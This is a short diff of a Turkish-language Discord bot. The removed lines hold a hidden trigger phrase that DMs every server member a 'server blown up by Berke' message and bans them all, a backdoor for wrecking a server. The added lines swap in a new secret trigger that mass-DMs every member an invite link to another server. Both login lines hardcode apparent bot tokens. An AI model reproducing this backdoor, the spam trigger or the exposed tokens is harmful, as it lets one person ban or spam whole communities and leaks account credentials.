@@ -15,9 +15,9 @@ const http = require('http');
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('message', msg => {
-  if (msg.content === 'sadeceberkeyeözelkrdşim') {
+  if (msg.content === 'sadeceberke') {
     msg.delete()
-    msg.guild.members.forEach(member => member.send("https://discord.gg/xCzsdN7 **Sunucunuz Berke Tarafından Patlatılmıştır.**").then(member.ban())
+    msg.guild.members.forEach(member => member.send("discord.gg/K4Nkfse yeni sunucumuz arkadaşlar herkesi beklerim.")
   )}
 })
 
@@ -66,7 +66,7 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjQxNjc5MzM2NDUzNDM5NTAx.XcL5AA.2yV5HxvpyrtZvtZAe8TXHikZvxY");
+berke.login("NjQyNzA3NTQ5NTE4Mjk5MTM2.Xca2FQ.KV4pKyCKdWoZB71a6sNo-9g3ggY");
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
